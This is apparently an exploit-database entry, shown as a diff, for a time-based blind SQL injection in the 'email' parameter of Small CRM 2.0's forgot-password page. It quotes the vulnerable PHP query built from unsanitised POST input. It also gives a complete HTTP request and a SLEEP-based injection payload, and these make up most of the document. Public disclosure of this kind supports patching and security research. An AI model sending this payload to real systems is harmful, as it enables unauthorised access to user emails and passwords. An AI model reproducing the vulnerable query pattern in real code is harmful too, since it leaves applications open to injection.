@@ -1,0 +1,41 @@
+# Exploit Title: Small CRM 2.0 - 'email' SQL Injection
+# Google Dork: N/A
+# Date: 2020-10-10
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/small-crm-php/
+# Version: V2.0
+# Tested on: Kali Linux
+# CVE : N/A
+
+========== Vulnerable Code ==========
+
+mysqli_query $row1 = mysqli_query($con, "select email,password from user
+where email='" . $_POST['email'] . "'");  // dbconnection.php
+
+========== Post Request ====================
+
+POST /crm/forgot-password.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: localhost/crm/forgot-password.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+Connection: close
+Cookie: __test=ec283e73906679549573af64209a5d5b;
+PHPSESSID=4d272f5938b3ec9c60bb45c4d7b44497
+Upgrade-Insecure-Requests: 1
+
+email=test@test.com&submit=
+
+============= Vulnerable Parameter ===============
+
+email (POST)
+
+============= Payload  =========================
+
+' AND (SELECT 1543 FROM (SELECT(SLEEP(5)))gSRd) AND 'PCOX'='PCOX
